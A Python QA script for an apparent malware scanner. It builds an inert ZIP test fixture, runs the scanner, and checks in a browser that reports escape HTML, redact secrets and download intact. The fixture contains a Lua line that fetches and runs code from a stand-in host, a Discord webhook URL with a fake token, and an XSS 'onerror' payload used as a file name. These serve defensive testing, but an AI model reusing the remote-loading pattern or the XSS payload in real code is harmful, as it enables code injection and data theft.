"""Standalone browser QA for delivered reports/files, never a product GUI.

Requires agent-browser and a local Chromium executable. The HTTP server binds
only to loopback, exposes a fixed set of trusted QA files, and is removed after
the run. Synthetic source/archive bytes are scanned as data, never executed.
"""

from __future__ import annotations

import argparse
import hashlib
import html
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import zipfile
from datetime import UTC, datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[2]
HTML_LABEL = "<img src=x onerror=window.qaInjected=1>"
TOKEN = "MG_QA_TOKEN_12345678901234567890"
WEBHOOK_SECRET = "MG_QA_WEBHOOK_12345678901234567890"


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def require(condition: bool, description: str) -> None:
    if not condition:
        raise AssertionError(description)


def synthetic_archive(directory: Path) -> Path:
    """Construct inert ZIP bytes; these Lua labels/bodies are never interpreted."""
    sample = directory / f"گزارش token={TOKEN} {HTML_LABEL}.zip"
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_STORED) as archive:
        members = (
            (f"https://discord.com/api/webhooks/111111/{WEBHOOK_SECRET}.lua", b"return 1"),
            ("synthetic.lua", (
                b'PerformHttpRequest("https://example.invalid/version", '
                b"function(status, body, headers) loadstring(body) end)"
            )),
        )
        for name, content in members:
            entry = zipfile.ZipInfo(name, date_time=(2020, 1, 1, 0, 0, 0))
            archive.writestr(entry, content)
    sample.write_bytes(buffer.getvalue())
    return sample


def reports(directory: Path) -> tuple[dict[str, Any], str, str, list[int]]:
    sample = synthetic_archive(directory)
    exit_codes = []
    for format_name in ("json", "text"):
        output = directory / ("report.json" if format_name == "json" else "report.txt")
        command = [sys.executable, "-m", "malguard_cli", str(sample),
                   "--format", format_name, "--output", str(output)]
        # Execute only the trusted scanner module; the fixture is a path argument.
        result = subprocess.run(  # noqa: S603
            command, cwd=ROOT, capture_output=True, timeout=90, check=False,
        )
        require(result.returncode in (0, 1, 2, 3), f"CLI report generation failed: {format_name}")
        require(not result.stderr, f"Unexpected CLI stderr: {format_name}")
        exit_codes.append(result.returncode)
    text = (directory / "report.txt").read_text(encoding="utf-8")
    serialized = (directory / "report.json").read_text(encoding="utf-8")
    report = json.loads(serialized)
    require(bool(report["evidence"]), "Synthetic fixture must exercise evidence presentation")
    require(report["hashes"]["sha256"] == sha256(sample), "Report must hash original fixture")
    require(report["verdict"] in text, "Text and JSON verdict must agree")
    require(report["hashes"]["sha256"] in text, "Text and JSON SHA256 must agree")
    require(exit_codes[0] == exit_codes[1], "CLI text and JSON exit codes must agree")
    for evidence in report["evidence"]:
        require(evidence["description_fa"] in text and evidence["location"]["artifact_id"] in text,
                "Text and JSON evidence descriptions/locations must agree")
    for content in (text, serialized):
        require(TOKEN not in content and WEBHOOK_SECRET not in content, "Secret leaked in output")
        require("token=[REDACTED]" in content, "Token redaction was not exercised")
        require(HTML_LABEL in content, "HTML-looking path label must survive as text")
        require("\ufffd" not in content, "UTF-8 output contains replacement characters")
        require("گزارش" in content, "Persian Unicode must survive serialization")
    require("https://discord.com/api/webhooks/[REDACTED]" in serialized,
            "Webhook path redaction was not exercised")
    return report, text, serialized, exit_codes


def qa_html(report: dict[str, Any], text: str, serialized: str) -> bytes:
    """Escape all report strings. This temporary trusted wrapper is QA-only."""
    markup = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'">
<title>MalGuard temporary report delivery QA</title><style>
body{{font:16px system-ui,sans-serif;color:#172438;background:#fff;margin:28px;max-width:1280px}}
h1{{font-size:24px}}a{{color:#154b9a}}nav{{display:flex;gap:24px;flex-wrap:wrap;margin:22px 0}}
pre{{white-space:pre-wrap;overflow-wrap:anywhere;background:#f2f5f9;border:1px solid #cad3df;
padding:20px;line-height:1.7;font:14px/1.7 monospace;unicode-bidi:plaintext}}
summary{{cursor:pointer;padding:12px;background:#dfeafa}}#text{{text-align:right}}
.scope{{color:#435268}}code{{overflow-wrap:anywhere}}</style></head><body>
<h1>MalGuard report and delivery QA</h1>
<p class="scope">Temporary loopback test page. Reports and downloads are data; synthetic members are never executed.</p>
<p>Verdict: <strong id="verdict">{verdict}</strong> · Evidence records: <strong id="evidence-count">{count}</strong></p>
<nav><a id="json-download" download="report.json" href="/report.json">Download report JSON</a>
<a id="text-download" download="report.txt" href="/report.txt">Download Persian text</a>
<a id="zip-download" download="malguard-delivery.zip" href="/delivery.zip">Download delivery ZIP</a>
<a id="wheel-download" download="malguard.whl" href="/malguard.whl">Download Python wheel</a></nav>
<h2 lang="fa" dir="rtl">گزارش فارسی</h2><pre id="text" lang="fa" dir="rtl">{text}</pre>
<details id="json-details"><summary role="button" tabindex="0">گزارش JSON / Show JSON evidence</summary>
<h2>Complete evidence records</h2><pre id="evidence" dir="ltr">{evidence}</pre>
<h2>Full report JSON</h2>
<pre id="json" dir="ltr">{serialized}</pre></details>
</body></html>""".format(verdict=html.escape(report["verdict"]), count=len(report["evidence"]),
                        text=html.escape(text), serialized=html.escape(serialized),
                        evidence=html.escape(json.dumps(report["evidence"], ensure_ascii=False,
                                                       indent=2)))
    return markup.encode("utf-8")


def server_for(files: dict[str, tuple[Path, str]], requests: list[dict[str, Any]]) -> ThreadingHTTPServer:
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            item = files.get(self.path)
            if item is None:
                self.send_error(404)
                requests.append({"path": self.path, "status": 404})
                return
            path, content_type = item
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(path.stat().st_size))
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Content-Type-Options", "nosniff")
            if self.path != "/index.html":
                self.send_header("Content-Disposition", f'attachment; filename="{path.name}"')
            self.end_headers()
            with path.open("rb") as stream:
                shutil.copyfileobj(stream, self.wfile)
            requests.append({"path": self.path, "status": 200})

        def log_message(self, format: str, *args: Any) -> None:
            pass

    return ThreadingHTTPServer(("127.0.0.1", 0), Handler)


class Browser:
    def __init__(self, executable: Path, chromium: Path, temporary: Path) -> None:
        config = temporary / "agent-browser.json"
        config.write_text("{}\n", encoding="utf-8")
        self.base = [str(executable), "--config", str(config), "--session", "report-delivery",
                     "--namespace", "malguard-browser-qa", "--executable-path", str(chromium),
                     "--args", "--no-sandbox,--disable-dev-shm-usage",
                     "--allowed-domains", "127.0.0.1", "--json"]
        self.environment = {
            key: value for key, value in os.environ.items()
            if not key.startswith("AGENT_BROWSER_")
            and key not in {"HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"}
        }
        self.environment["AGENT_BROWSER_SOCKET_DIR"] = str(temporary / "sockets")
        self.commands: list[dict[str, Any]] = []

    def run(self, *arguments: str) -> Any:
        # The executable is an operator-selected QA tool, with fixed harness commands.
        completed = subprocess.run(  # noqa: S603
            self.base + list(arguments), env=self.environment,
            capture_output=True, text=True, timeout=60, check=False,
        )
        record: dict[str, Any] = {"argv": list(arguments), "exit_code": completed.returncode}
        self.commands.append(record)
        try:
            result = json.loads(completed.stdout)
        except json.JSONDecodeError as error:
            record.update(stdout=completed.stdout, stderr=completed.stderr)
            raise AssertionError(f"Browser command did not return JSON: {arguments[0]}") from error
        record["success"] = result.get("success")
        if not result.get("success"):
            record.update(result=result, stderr=completed.stderr)
        require(completed.returncode == 0 and result.get("success"),
                f"Browser command failed: {arguments[0]}: {result.get('error')}")
        return result.get("data")

    def evaluate(self, script: str) -> Any:
        data = self.run("eval", script)
        return data["result"]


def snapshot_text(snapshot: Any) -> str:
    return snapshot.get("snapshot", "") if isinstance(snapshot, dict) else str(snapshot)


def ref_for(snapshot: Any, label: str) -> str:
    for line in snapshot_text(snapshot).splitlines():
        if label in line:
            match = re.search(r"\bref=(e\d+)\]", line)
            if match:
                return "@" + match.group(1)
    raise AssertionError(f"Missing interactive snapshot ref: {label}; {snapshot_text(snapshot)}")


def zip_crc(path: Path) -> dict[str, Any]:
    with zipfile.ZipFile(path) as archive:
        require(archive.testzip() is None, f"ZIP CRC failure: {path.name}")
        return {"member_count": len(archive.infolist()), "crc_ok": True}


def perform(args: argparse.Namespace) -> dict[str, Any]:
    agent_browser = Path(args.agent_browser).resolve()
    chromium = Path(args.chromium).resolve()
    delivery = Path(args.delivery_zip).resolve()
    wheel = Path(args.wheel).resolve()
    screenshots = Path(args.screenshots).resolve()
    for item in (agent_browser, chromium, delivery, wheel):
        require(item.is_file(), f"Required file missing: {item}")
    screenshots.mkdir(parents=True, exist_ok=True)
    result: dict[str, Any] = {
        "status": "PASS", "tested_at_utc": datetime.now(UTC).isoformat(),
        "scope": "CLI report browser presentation and native file download integrity; not detection accuracy",
        "browser_tool": "agent-browser", "temporary_qa_page": True,
        "sample_execution": False, "sample_upload": False, "published": False,
        "commands_require_loopback_network_permission": True,
        "versions": {"python": sys.version.split()[0], "scanner_python": sys.executable},
    }
    for name, command in (("agent_browser", [str(agent_browser), "--version"]),
                          ("chromium", [str(chromium), "--version"])):
        # Version probes run only the same explicitly selected trusted QA executables.
        version = subprocess.run(  # noqa: S603
            command, capture_output=True, text=True, timeout=10, check=True,
        )
        result["versions"][name] = version.stdout.strip()
    with tempfile.TemporaryDirectory(prefix="malguard-browser-qa-") as temporary_name:
        temporary = Path(temporary_name)
        report, text, serialized, exit_codes = reports(temporary)
        page = temporary / "index.html"
        page.write_bytes(qa_html(report, text, serialized))
        requests: list[dict[str, Any]] = []
        server = server_for({
            "/index.html": (page, "text/html; charset=utf-8"),
            "/report.json": (temporary / "report.json", "application/json; charset=utf-8"),
            "/report.txt": (temporary / "report.txt", "text/plain; charset=utf-8"),
            "/delivery.zip": (delivery, "application/zip"),
            "/malguard.whl": (wheel, "application/octet-stream"),
        }, requests)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        browser = Browser(agent_browser, chromium, temporary)
        try:
            browser.run("open", f"http://127.0.0.1:{server.server_port}/index.html")
            browser.run("wait", "--load", "networkidle")
            before = browser.run("snapshot", "-i")
            browser.run("screenshot", str(screenshots / "persian-report.png"), "--full")
            dom = browser.evaluate("""({
              text: document.querySelector('#text').textContent,
              json: document.querySelector('#json').textContent,
              evidence: document.querySelector('#evidence').textContent,
              encoding: document.characterSet,
              language: document.querySelector('#text').lang,
              direction: document.querySelector('#text').dir,
              injected: window.qaInjected === undefined,
              activeContentCount: document.querySelectorAll('script,img,iframe,object,embed').length
            })""")
            require(dom["text"] == text and dom["json"] == serialized,
                    "Browser presentation must exactly match UTF-8 report bytes")
            require(dom["encoding"] == "UTF-8" and dom["language"] == "fa"
                    and dom["direction"] == "rtl", "Persian report presentation metadata mismatch")
            require(dom["injected"] and dom["activeContentCount"] == 0,
                    "HTML-looking logical paths produced active content")
            browser.run("click", ref_for(before, "Show JSON evidence"))
            after = browser.run("snapshot", "-i")
            require(browser.evaluate("document.querySelector('#json-details').open"),
                    "JSON report disclosure did not open")
            browser.run("scrollintoview", "#json-details")
            browser.run("screenshot", str(screenshots / "json-evidence.png"))
            downloads: dict[str, Any] = {}
            for label, output_name, original, archive in (
                ("Download report JSON", "report-downloaded.json", temporary / "report.json", False),
                ("Download Persian text", "report-downloaded.txt", temporary / "report.txt", False),
                ("Download delivery ZIP", "delivery-downloaded.zip", delivery, True),
                ("Download Python wheel", "wheel-downloaded.whl", wheel, True),
            ):
                destination = temporary / output_name
                browser.run("download", ref_for(after, label), str(destination))
                expected_hash, downloaded_hash = sha256(original), sha256(destination)
                require(original.stat().st_size == destination.stat().st_size,
                        f"Native browser download changed length: {label}")
                require(expected_hash == downloaded_hash, f"Native browser download changed bytes: {label}")
                check = {"sha256": downloaded_hash, "bytes": destination.stat().st_size,
                         "matches_source": True, "native_browser_download": True}
                if archive:
                    source_crc, downloaded_crc = zip_crc(original), zip_crc(destination)
                    require(source_crc == downloaded_crc, "ZIP member counts must agree after download")
                    check.update(downloaded_crc)
                downloads[label] = check
                if output_name.endswith(".json"):
                    downloaded_report = json.loads(destination.read_text(encoding="utf-8"))
                    require(downloaded_report == report, "Downloaded JSON differs from displayed report")
                    require(downloaded_report["evidence"] == json.loads(dom["json"])["evidence"],
                            "Displayed and downloaded complete evidence records differ")
                    require(downloaded_report["evidence"] == json.loads(dom["evidence"]),
                            "Displayed evidence section differs from downloaded report")
                if output_name.endswith(".txt"):
                    require(destination.read_text(encoding="utf-8") == dom["text"],
                            "Downloaded Persian text differs from displayed report")
                after = browser.run("snapshot", "-i")
            errors = browser.run("errors")
            console = browser.run("console")
            require(not errors.get("errors"), "Browser reported uncaught page errors")
            result.update(
                cli_report_exit_codes=exit_codes,
                report={"verdict": report["verdict"], "risk_score": report["risk_score"],
                        "coverage_score": report["coverage_score"],
                        "fixture_sha256": report["hashes"]["sha256"],
                        "evidence_count": len(report["evidence"]),
                        "evidence_ids": [item["id"] for item in report["evidence"]]},
                checks={"utf8_persian": True, "text_json_verdict_and_hash_agree": True,
                        "token_redacted": True, "webhook_redacted": True,
                        "html_logical_paths_plain_text": True,
                        "displayed_downloaded_json_equal": True,
                        "complete_evidence_records_equal": True,
                        "uncaught_page_errors": 0},
                downloads=downloads, snapshots={"before": snapshot_text(before),
                                                "after": snapshot_text(after)},
                browser_errors=errors, browser_console=console,
                screenshots=[str((screenshots / name).relative_to(ROOT))
                             if (screenshots / name).is_relative_to(ROOT)
                             else str(screenshots / name)
                             for name in ("persian-report.png", "json-evidence.png")],
            )
        finally:
            try:
                browser.run("close")
            finally:
                server.shutdown()
                server.server_close()
                thread.join(timeout=5)
                result["commands"] = browser.commands
                result["browser_launch_argv"] = browser.base
                result["loopback_requests"] = requests
    return result


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent-browser", default=shutil.which("agent-browser"))
    parser.add_argument("--chromium", default="/usr/bin/chromium")
    parser.add_argument("--delivery-zip", default=str(ROOT.parent / "malguard-delivery.zip"))
    parser.add_argument("--wheel", default=str(ROOT / "dist/malguard-1.0.0-py3-none-any.whl"))
    parser.add_argument("--output-json", default=str(ROOT / "docs/browser-qa.json"))
    parser.add_argument("--screenshots", default=str(ROOT / "docs/browser-qa"))
    args = parser.parse_args()
    require(bool(args.agent_browser), "agent-browser must be installed or explicitly provided")
    result = perform(args)
    output = Path(args.output_json)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(json.dumps(result, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(json.dumps({"status": result["status"], "evidence_count": result["report"]["evidence_count"],
                      "output": str(output), "downloads": len(result["downloads"])}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
